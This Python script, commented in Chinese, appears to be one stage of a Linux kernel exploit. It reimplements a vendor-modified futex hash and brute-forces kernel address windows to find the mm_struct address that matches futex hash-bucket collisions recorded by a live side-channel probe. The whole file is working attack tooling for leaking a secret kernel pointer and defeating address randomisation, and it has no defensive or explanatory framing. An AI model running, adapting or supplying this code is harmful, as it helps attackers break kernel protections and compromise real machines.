#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""g2_pair_search2.py — 用本机内核真实哈希（初值无长度项）重跑 G2。

本机 futex_wake/futex_requeue 内联哈希反汇编终审：
  a = b = c = 0xdeadbeef + offset          ← 无 (length<<2)！
  a += mm_lo; b += mm_hi; c += page_lo; __jhash_mix(a,b,c)
  a += page_hi; __jhash_final(a,b,c)
  bucket = c & (futex_hashsize - 1)
（独立 out-of-line jhash 字节版仍带长度项，说明是 hash_futex 专用变体/厂商改动）

约束：严格同桶（heat=同桶 256 链遍历，transfer2 已证桶索引性）。
网格：A) 8K/16K 步长 slab 基址 × 896*i, i<36；B) 全 32 字节网格。
窗口：corrected 0xffffffc000000000(+8GB) 与 legacy 0xffffff8000000000(+8GB)。
"""
import numpy as np

U32 = np.uint32
MASK32 = 0xFFFFFFFF

def rol(w, s):
    if s == 0:
        return w
    return ((w << np.uint32(s)) | (w >> np.uint32(32 - s))) & U32(MASK32)

def kernel_futex_hash(k0, k1, k2, k3, seed):
    """本机内核 hash_futex：jhash2 无长度项变体"""
    init = (0xdeadbeef + seed) & MASK32          # ← 关键修正：无 +16
    a = (k0 + init) & MASK32
    b = (k1 + init) & MASK32
    c = (k2 + init) & MASK32
    # __jhash_mix
    a = (a - c) & MASK32; a = (a ^ rol(c, 4)) & MASK32;  c = (c + b) & MASK32
    b = (b - a) & MASK32; b = (b ^ rol(a, 6)) & MASK32;  a = (a + c) & MASK32
    c = (c - b) & MASK32; c = (c ^ rol(b, 8)) & MASK32;  b = (b + a) & MASK32
    a = (a - c) & MASK32; a = (a ^ rol(c, 16)) & MASK32; c = (c + b) & MASK32
    b = (b - a) & MASK32; b = (b ^ rol(a, 19)) & MASK32; a = (a + c) & MASK32
    c = (c - b) & MASK32; c = (c ^ rol(b, 4)) & MASK32;  b = (b + a) & MASK32
    # tail: a += k3
    a = (a + k3) & MASK32
    # __jhash_final
    c = (c ^ b) & MASK32; c = (c - rol(b, 14)) & MASK32
    a = (a ^ c) & MASK32; a = (a - rol(c, 11)) & MASK32
    b = (b ^ a) & MASK32; b = (b - rol(a, 25)) & MASK32
    c = (c ^ b) & MASK32; c = (c - rol(b, 16)) & MASK32
    a = (a ^ c) & MASK32; a = (a - rol(c, 4)) & MASK32
    b = (b ^ a) & MASK32; b = (b - rol(a, 14)) & MASK32
    c = (c ^ b) & MASK32; c = (c - rol(b, 24)) & MASK32
    return c

def hash_va(va, mm):
    va = np.uint64(va); mm = np.asarray(mm, dtype=np.uint64)
    page = va & ~np.uint64(0xfff)
    off = np.uint32(va & np.uint64(0xfff))
    k0 = (mm & np.uint64(0xffffffff)).astype(np.uint32)
    k1 = (mm >> np.uint64(32)).astype(np.uint32)
    k2 = (page & np.uint64(0xffffffff)).astype(np.uint32)
    k3 = (page >> np.uint64(32)).astype(np.uint32)
    return kernel_futex_hash(k0, k1, k2, k3, off)

def load_result(path):
    hits, inc = [], None
    for line in open(path):
        p = line.split()
        if p[0] == 'hit':
            hits.append(int(p[2], 16))
        elif p[0] == 'inc':
            inc = int(p[1], 16)
    return inc, hits

def main():
    inc, hits = load_result('live_probe/ks_e2e2_result.txt')
    addrs = np.array([inc] + hits, dtype=np.uint64)
    print('target inc = 0x%x, %d hits' % (inc, len(hits)), flush=True)

    WINDOWS = [('corrected', 0xffffffc000000000, 8 << 30),
               ('legacy   ', 0xffffff8000000000, 8 << 30)]

    for name, W, size in WINDOWS:
        # ---- 网格 A: 结构网格 ----
        n_base = size // 8192
        for start in range(0, n_base, 4_000_000):
            end = min(start + 4_000_000, n_base)
            k = np.arange(start, end, dtype=np.uint64)
            base = np.uint64(W) + k * np.uint64(8192)
            h0 = hash_va(inc, base)
            for i in range(36):
                cand = base + np.uint64(i * 896)
                ok = hash_va(hits[0], cand) == h0
                if not ok.any():
                    continue
                idx = np.nonzero(ok)[0]
                for j in range(1, len(hits)):
                    ok[idx] &= hash_va(hits[j], cand[idx]) == h0[idx]
                for t in np.nonzero(ok)[0]:
                    print('GRID-A %s HIT mm=0x%016x (slab_base=0x%x i=%d)' %
                          (name, int(cand[t]), int(base[t]), i), flush=True)
        print('%s grid-A done' % name, flush=True)
        # ---- 网格 B: 全 32 ----
        n32 = size // 32
        for start in range(0, n32, 8_000_000):
            end = min(start + 8_000_000, n32)
            n = np.arange(start, end, dtype=np.uint64)
            cand = np.uint64(W) + n * np.uint64(32)
            h0 = hash_va(inc, cand)
            ok = hash_va(hits[0], cand) == h0
            idx = np.nonzero(ok)[0]
            if len(idx):
                c2 = cand[idx]; h0c = h0[idx]
                for j in range(1, len(hits)):
                    keep = hash_va(hits[j], c2) == h0c
                    c2 = c2[keep]; h0c = h0c[keep]
                for t in range(len(c2)):
                    print('GRID-B %s HIT mm=0x%016x' % (name, int(c2[t])), flush=True)
        print('%s grid-B done' % name, flush=True)
    print('done')

if __name__ == '__main__':
    main()
